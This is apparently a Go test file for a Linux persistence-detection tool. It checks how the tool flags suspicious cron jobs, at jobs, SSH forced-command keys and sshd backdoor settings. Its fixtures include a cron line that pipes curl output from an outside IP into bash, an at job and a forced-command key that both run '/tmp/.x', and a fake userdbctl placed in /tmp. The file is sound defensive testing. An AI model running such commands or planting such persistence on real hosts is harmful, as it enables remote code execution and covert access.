package checks

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/facts"
)

// --- cron (§7.1) ---

func TestCronSuspectUsaOMesmoCriterioDaUnit(t *testing.T) {
	f := &facts.Facts{Cron: []facts.CronEntry{
		{File: "/etc/cron.d/zz", Kind: "dropin", User: "root", Line: 3,
			Schedule: "*/7 * * * *", IntervalSec: 420,
			Cmd: "/bin/sh -c 'curl -s http://198.51.100.7/a | bash'"},
		{File: "/etc/crontab", Kind: "system", User: "root",
			Schedule: "17 * * * *", Cmd: "cd / && run-parts --report /etc/cron.hourly"},
	}}
	r := cronSuspect.Run(cronSuspect, f, imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("achados = %v — só a linha que baixa e executa", r.Findings)
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	for _, quer := range []string{"roda como: root", "/etc/cron.d/zz:3"} {
		if !strings.Contains(ev, quer) {
			t.Errorf("falta %q na evidência: %s", quer, ev)
		}
	}
}

func TestCronIntervalo(t *testing.T) {
	casos := map[string]int{
		"*/7 * * * *":  420, // o favorito: não casa com janela redonda
		"* * * * *":    60,  // a cada minuto
		"*/30 * * * *": 1800,
		"0 */2 * * *":  7200,
		"@hourly":      3600,
		"@daily":       86400,
		"@reboot":      0, // sobrevive a restart, mas não é periódico
		"17 3 * * *":   0, // horário fixo: não é intervalo
		"lixo":         0,
	}
	for sched, quer := range casos {
		if got := facts.CronIntervalParaTeste(sched); got != quer {
			t.Errorf("intervalo(%q) = %d, quer %d", sched, got, quer)
		}
	}
}

func TestCronFrequentSoDisparaEmIntervaloCurto(t *testing.T) {
	f := &facts.Facts{Cron: []facts.CronEntry{
		{File: "/var/spool/cron/crontabs/app", Kind: "user", User: "app",
			Schedule: "*/7 * * * *", IntervalSec: 420, Cmd: "/usr/local/bin/x"},
		{File: "/etc/cron.daily/logrotate", Kind: "dir",
			Schedule: "daily", IntervalSec: 86400, Cmd: "/etc/cron.daily/logrotate"},
	}}
	r := cronFrequent.Run(cronFrequent, f, imgEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d, quer 1", len(r.Findings))
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "§2.7") {
		t.Error("o achado precisa mandar correlacionar com a janela estendida")
	}
}

// O at é o gatilho que mais escapa: dispara UMA vez no futuro, então não
// aparece em varredura de periodicidade nenhuma.
func TestAtJobEntregaQuemAgendou(t *testing.T) {
	f := &facts.Facts{Cron: []facts.CronEntry{{
		File: "/var/spool/cron/atjobs/a0001", Kind: "at",
		Cmd: "/tmp/.x", ModUTC: "2026-08-17T04:00:00Z",
		Env: []facts.EnvSetting{
			{Key: "SSH_CONNECTION", Value: "203.0.113.9 51234 10.0.0.5 22"},
			{Key: "USER", Value: "app"},
		},
	}}}
	r := atJob.Run(atJob, f, imgEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d", len(r.Findings))
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	// O job guarda o ambiente de quem o criou: o IP de origem sai de graça.
	if !strings.Contains(ev, "203.0.113.9") {
		t.Errorf("o SSH_CONNECTION do job entrega o IP de quem agendou: %s", ev)
	}
	if r.Findings[0].Sev != check.SevCritical {
		t.Errorf("comando de /tmp num at devia subir para CRITICAL: %s", r.Findings[0].Sev)
	}
}

// --- SSH (§7.5) ---

func TestChaveComComandoForcado(t *testing.T) {
	f := &facts.Facts{SSHKeys: []facts.SSHKey{
		{File: "/root/.ssh/authorized_keys", User: "root", Line: 2,
			Options: `command="/tmp/.x",no-pty`, Type: "ssh-rsa",
			Fingerprint: "SHA256:abc", Comment: "kali@attacker"},
		{File: "/root/.ssh/authorized_keys", User: "root", Line: 1,
			Type: "ssh-ed25519", Fingerprint: "SHA256:def", Comment: "lex@estacao"},
	}}
	r := sshForcedCommand.Run(sshForcedCommand, f, imgEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %d — só a chave com command=", len(r.Findings))
	}
	if r.Findings[0].Sev != check.SevCritical {
		t.Errorf("comando em /tmp devia subir para CRITICAL: %s", r.Findings[0].Sev)
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	for _, quer := range []string{"SHA256:abc", "kali@attacker"} {
		if !strings.Contains(ev, quer) {
			t.Errorf("falta %q — é o IOC de frota: %s", quer, ev)
		}
	}
}

func TestOpcoesComAspasNaoQuebramOParsing(t *testing.T) {
	// O bloco de opções vem ANTES do tipo e pode ter espaço dentro das aspas.
	// Cortar por espaço perderia metade da opção, que é onde mora o gatilho.
	k := facts.ParseAuthorizedKeyParaTeste(
		`command="/usr/bin/rrsync -ro /srv",no-pty,no-agent-forwarding ssh-rsa AAAAB3Nz backup@nas`)
	if !strings.Contains(k.Options, "/srv") {
		t.Errorf("opções cortadas no espaço interno: %q", k.Options)
	}
	if k.Type != "ssh-rsa" || k.Comment != "backup@nas" {
		t.Errorf("tipo=%q comentário=%q", k.Type, k.Comment)
	}
	cmd, ok := comandoForcado(k.Options)
	if !ok || cmd != "/usr/bin/rrsync -ro /srv" {
		t.Errorf("comandoForcado = %q,%v", cmd, ok)
	}
}

// O Arch entrega userdbctl de fábrica: disparar nele faria toda varredura de
// Arch virar ruído. A isenção é do programa NO LUGAR CERTO.
func TestIntegracaoDeDiretorioConhecidaNaoDispara(t *testing.T) {
	base := facts.SSHConfig{Files: []string{"/etc/ssh/sshd_config"}}

	conhecida := base
	conhecida.AuthorizedKeysCommand = "/usr/bin/userdbctl ssh-authorized-keys %u"
	if r := sshdBackdoor.Run(sshdBackdoor, &facts.Facts{SSH: conhecida}, imgEnv()); len(r.Findings) != 0 {
		t.Errorf("systemd-userdb em /usr/bin não pode disparar: %v", r.Findings[0].Evidence)
	}

	// Mesmo nome, lugar errado: não herda reputação nenhuma.
	falsa := base
	falsa.AuthorizedKeysCommand = "/tmp/userdbctl x"
	if r := sshdBackdoor.Run(sshdBackdoor, &facts.Facts{SSH: falsa}, imgEnv()); len(r.Findings) != 1 {
		t.Error("userdbctl em /tmp precisa disparar")
	}

	desconhecida := base
	desconhecida.AuthorizedKeysCommand = "/usr/local/sbin/keyfetch"
	if r := sshdBackdoor.Run(sshdBackdoor, &facts.Facts{SSH: desconhecida}, imgEnv()); len(r.Findings) != 1 {
		t.Error("programa desconhecido precisa disparar")
	}
}

func TestAuthorizedKeysFileForaDoPadrao(t *testing.T) {
	casos := map[string]int{
		".ssh/authorized_keys":                          0,
		"%h/.ssh/authorized_keys .ssh/authorized_keys2": 0,
		"/etc/ssh/keys/%u":                              1,
	}
	for v, quer := range casos {
		f := &facts.Facts{SSH: facts.SSHConfig{
			Files: []string{"/etc/ssh/sshd_config"}, AuthorizedKeysFile: v}}
		if r := sshdBackdoor.Run(sshdBackdoor, f, imgEnv()); len(r.Findings) != quer {
			t.Errorf("AuthorizedKeysFile=%q deu %d achados, quer %d", v, len(r.Findings), quer)
		}
	}
}

// O inventário é MANUAL de propósito: "esta chave é de alguém do time?" não é
// decidível por máquina.
func TestInventarioDeChavesEhManualEAgrupaPorUsuario(t *testing.T) {
	f := &facts.Facts{SSHKeys: []facts.SSHKey{
		{User: "root", File: "/root/.ssh/authorized_keys", Line: 1, Fingerprint: "SHA256:a"},
		{User: "root", File: "/root/.ssh/authorized_keys", Line: 2, Fingerprint: "SHA256:b"},
		{User: "app", File: "/home/app/.ssh/authorized_keys", Line: 1, Fingerprint: "SHA256:c"},
	}}
	r := sshKeyInventory.Run(sshKeyInventory, f, imgEnv())
	if len(r.Findings) != 2 {
		t.Fatalf("achados = %d, quer 2 (um por usuário)", len(r.Findings))
	}
	for _, fd := range r.Findings {
		if fd.Sev != check.SevManual {
			t.Errorf("%s: severidade = %s, quer MANUAL", fd.Subject, fd.Sev)
		}
	}
}

// O agendador da própria distribuição não é anomalia. O Alpine entrega
// `*/15 run-parts /etc/periodic/15min` de fábrica — e um contêiner Alpine
// limpo disparando é a parede de ruído que treina o operador a ignorar tudo.
func TestCronFrequentPulaOAgendadorDaDistro(t *testing.T) {
	f := &facts.Facts{Cron: []facts.CronEntry{
		{File: "/var/spool/cron/crontabs/root", Kind: "user", User: "root",
			Schedule: "*/15 * * * *", IntervalSec: 900,
			Cmd: "run-parts /etc/periodic/15min"},
		{File: "/etc/crontab", Kind: "system", User: "root",
			Schedule: "17 * * * *", IntervalSec: 3600,
			Cmd: "cd / && run-parts --report /etc/cron.hourly"},
	}}
	if r := cronFrequent.Run(cronFrequent, f, imgEnv()); len(r.Findings) != 0 {
		t.Errorf("disparou no plumbing da distribuição: %v", r.Findings[0].Evidence)
	}

	// Mas run-parts apontando para outro lugar NÃO é plumbing.
	f.Cron[0].Cmd = "run-parts /tmp/jobs"
	f.Cron[0].IntervalSec = 300
	if r := cronFrequent.Run(cronFrequent, f, imgEnv()); len(r.Findings) != 1 {
		t.Error("run-parts sobre /tmp não herda a reputação do periodic da distro")
	}
}

// Quinze minutos é cadência REDONDA, e cadência redonda é o que manutenção
// legítima usa. O favorito do beacon é o número que não casa com janela
// nenhuma — a §7.1 cita */7.
func TestCronFrequentUsaLimiteEstrito(t *testing.T) {
	mk := func(seg int) *facts.Facts {
		return &facts.Facts{Cron: []facts.CronEntry{{
			File: "/etc/cron.d/x", Kind: "dropin", User: "root",
			IntervalSec: seg, Schedule: "*/n", Cmd: "/usr/local/bin/x"}}}
	}
	if r := cronFrequent.Run(cronFrequent, mk(900), imgEnv()); len(r.Findings) != 0 {
		t.Error("15 minutos exatos é cadência de manutenção, não de beacon")
	}
	if r := cronFrequent.Run(cronFrequent, mk(420), imgEnv()); len(r.Findings) != 1 {
		t.Error("*/7 é o favorito do beacon e precisa disparar")
	}
}

// A RESTRIÇÃO inverte o sinal. `command=` sozinho é a forma do atacante — ele
// quer que algo rode. `command=` com `no-pty` e `restrict` é a forma do
// administrador: ele está IMPEDINDO o shell que o atacante quer.
func TestComandoForcadoCaiComRestricao(t *testing.T) {
	f := &facts.Facts{SSHKeys: []facts.SSHKey{
		{User: "root", Line: 1, File: "/root/.ssh/authorized_keys",
			Options: `command="/usr/bin/backup.sh"`},
		{User: "root", Line: 2, File: "/root/.ssh/authorized_keys",
			Options: `restrict,command="/usr/bin/rrsync -ro /srv",no-pty`},
	}}
	r := sshForcedCommand.Run(sshForcedCommand, f, testEnv())
	if len(r.Findings) != 2 {
		t.Fatalf("as duas continuam no inventário: %v", r.Findings)
	}
	sev := map[string]check.Severity{}
	for _, fd := range r.Findings {
		sev[fd.Subject] = fd.Sev
	}
	if sev["root:1"] != check.SevWarn {
		t.Error("comando forçado sem restrição é a forma do atacante")
	}
	if sev["root:2"] != check.SevInfo {
		t.Error("chave endurecida vira informação: acusá-la de backdoor ensina o " +
			"operador a ignorar este check, e aí ele perde o achado que importa")
	}
}
